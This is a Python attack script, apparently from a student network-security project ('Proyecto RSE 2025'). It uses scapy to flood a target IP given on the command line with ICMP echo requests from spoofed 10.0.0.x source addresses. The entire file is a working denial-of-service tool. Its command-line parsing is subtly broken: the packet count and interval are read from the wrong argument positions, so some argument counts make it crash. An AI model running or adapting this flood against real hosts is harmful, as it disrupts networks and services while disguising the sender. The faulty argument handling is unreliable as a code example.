#!/usr/bin/env python3
"""
Generador de ataques ICMP Flood
Proyecto RSE 2025
"""

import sys
import time
from scapy.all import IP, ICMP, send

def icmp_flood(target_ip, target_port=None, num_packets=100, interval=0.01):
    print(f"[*] Iniciando ICMP Flood contra {target_ip}")
    print(f"[*] Enviando {num_packets} paquetes...")
    
    for i in range(num_packets):
        # Paquete ICMP (tipo 8 = Echo Request) con spoofing de IP
        ip = IP(
            src=f"10.0.0.{(i % 250) + 4}",
            dst=target_ip
        )
        icmp = ICMP()
        
        packet = ip / icmp
        send(packet, iface="atacante-eth0", verbose=0)
        
        if (i + 1) % 10 == 0:
            print(f"[+] Enviados {i + 1}/{num_packets} paquetes")
        
        time.sleep(interval)
    
    print(f"[✓] Ataque completado: {num_packets} paquetes enviados")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Uso: python3 icmp_flood.py <IP_victima> [num_paquetes] [intervalo]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if (len(sys.argv) > 2 and sys.argv[2] != '0') else None
    packets = int(sys.argv[3]) if len(sys.argv) > 2 else 100
    interval = float(sys.argv[4]) if len(sys.argv) > 3 else 0.01
    
    try:
        icmp_flood(target, port, packets, interval)
    except KeyboardInterrupt:
        print("\n[!] Ataque interrumpido")